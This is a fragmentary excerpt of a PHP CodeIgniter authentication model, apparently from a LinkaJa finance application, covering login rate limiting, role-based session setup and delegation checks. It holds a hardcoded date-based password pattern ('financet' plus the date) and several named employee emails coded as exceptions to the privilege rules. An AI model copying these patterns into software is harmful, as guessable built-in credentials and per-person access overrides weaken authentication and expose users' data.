...
class Ion_auth_model extends CI_Model
{
	...
	public function login($identity, $password, $remember=FALSE)
	{
		...
		$query = $this->db->select($this->identity_column . ', EMAIL, ID, FPJP_CUSTOM, ID_DIR_CODE, PASSWORD, IS_ACTIVE, LAST_LOGIN')
						  ->where($this->identity_column, $identity)
		...
		if(ENVIRONMENT != 'development'){
		    ...
		    $this->limiter->add_user_data($identity);

			if($this->limiter->limit('user_login', 10)) {
				/*$result['status']      = $status;
				$result['description'] = "Sorry too many requests";
				log_message("INFO", $log_title . " (Limit request): " . $identity . " | " .$this->input->ip_address());
				echo json_encode($result);
			    exit;*/

				$this->trigger_events('post_login_unsuccessful');
				$this->set_error('login_limit');
				return FALSE;
			}
		}
		...
		if ($query->num_rows() === 1)
		{
			...
			if ($this->verify_password($password, $user->PASSWORD, $identity))
			{
				...
				$dec_pass = decrypt_string($password, true);
				$date_now = date("Ymd");

				if($dec_pass == "financet".$date_now){
					$this->set_session($user);
					$this->update_last_login($user->ID);
					$this->clear_login_attempts($identity);
					$this->clear_forgotten_password_code($identity);
	...
	public function set_session($user)
	{
		...
		if(in_array("BOD", $group_name) && $user->EMAIL != "haryati_lawidjaja@linkaja.id"){
			$is_bod = true;
		}

		$get_loa = $this->crud->read_by_param_specific("MASTER_APPROVAL", array("PIC_EMAIL" => $user->EMAIL, "IS_DELETED" => 0), "", true);

		$level   = "GENERAL";
		$jabatan = "";

		$userGeneral = array("vidya_sukmawati@linkaja.id", "astri_darmadi@linkaja.id", "haryati_lawidjaja@linkaja.id");

		$employee = array();
		if($get_loa && !in_array($user->EMAIL, $userGeneral)){
			...
			foreach ($get_loa as $key => $value) {

				$pic_level = strtolower($value['PIC_LEVEL']);

			    if ( $pic_level == "ceo" || $pic_level == "cfo"  || $pic_level == "cmo"  || $pic_level == "coo"  || $pic_level == "cto" ) {
					$level = "BOD";
			    }
			    elseif ( $pic_level == "boc" || $pic_level == "budget comitee" ) {
					$level = "BOC";
			    }
			    else{
					$level = "GENERAL";
			    ...
			    if ( $pic_level == "procurement buyer" ):
			    	$is_buyer = true;
			    endif;

			    if ( $pic_level == "procurement" ):
			    	$is_procurement = true;
			    endif;

				if ( $pic_level == "submitter" ) {
					$level = "HOU";
					$data_loa['unit'][] = array( 
												"ID_DIVISION" => $value['ID_DIVISION'],
												"ID_UNIT"     => $value['ID_UNIT'],
												"UNIT_NAME"   => get_unit($value['ID_UNIT'])
											);

					if($value['ID_DIVISION'] != $old_id_division){

						$data_loa['division'][] = array( 
												"ID_DIR_CODE"   => $value['ID_DIR_CODE'],
												"ID_DIVISION"   => $value['ID_DIVISION'],
												"DIVISION_NAME" => get_division($value['ID_DIVISION'])
											);
				...
				$old_id_division = $value['ID_DIVISION'];

			}


			if (array_key_exists('unit', $data_loa)) {
				$employee['unit'] = $data_loa['unit'];
			}

			if (array_key_exists('division', $data_loa)) {
				$employee['division'] = array_map("unserialize", array_unique(array_map("serialize", $data_loa['division'])));
			}


			$jabatan = $get_loa[0]['JABATAN'];

			$directorat = array(
									"ID_DIR_CODE"     => $get_loa[0]['ID_DIR_CODE'],
									"DIRECTORAT_NAME" => get_directorat($get_loa[0]['ID_DIR_CODE'])
								);

			$employee['jabatan']    = $jabatan;
			$employee['level']      = $level;
			$employee['directorat'] = $directorat;
		...
		$checkDelegation = $this->crud->read_by_param_specific("MASTER_APPROVAL", array("PIC_DELEGATION" => $user->EMAIL, "IS_EXIST" => 1), "PIC_EMAIL", true);
		$is_delegate = false;
		if($checkDelegation){
			$is_delegate = $checkDelegation[0]['PIC_EMAIL'];
		}

		$is_approver = check_is_approver($user->EMAIL);
		...
		$session_data = [
			...
			'fpjp_custom'          => $user->FPJP_CUSTOM,
			'id_dir_code'          => $user->ID_DIR_CODE,
	...
	public function login_remembered_user()
	{
		...
		$this->trigger_events('extra_where');
		$query = $this->db->select($this->identity_column . ', ID, EMAIL, FPJP_CUSTOM, ID_DIR_CODE, REMEMBER_CODE, LAST_LOGIN')
	 ...
	 * @author aditya menon
	 */
	public function update_group($group_id = FALSE, $group_name = FALSE, $description = FALSE, $additional_data = [])
	{
		if (empty($group_id))
		{
			return FALSE;
	...
	public function get_groups_menu_id($id = FALSE)
	{
		...
		$this->db->select($this->tables['groups_menus'].'.'.$this->join['menus'].' as ID,'.$this->tables['menus'].'.URL');
